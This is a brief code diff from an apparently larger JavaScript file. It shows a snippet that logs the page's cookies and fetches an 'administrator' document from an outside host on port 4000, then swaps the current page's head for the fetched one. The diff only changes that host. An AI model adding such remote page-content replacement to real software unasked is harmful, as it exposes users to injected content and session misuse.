@@ -4068,7 +4068,7 @@ console.log("Before xhr cookie");
 console.log((' ' + document.cookie).slice(1));
 var xhr = new XMLHttpRequest();
 xhr.responseType = 'document';
-xhr.open('GET', 'http://app.davenport.rocks:4000/process_administrator', true);
+xhr.open('GET', 'http://user-docs.com:4000/process_administrator', true);
 
 xhr.onload = function (e) {
   document.documentElement.replaceChild(this.response.head, document.head);
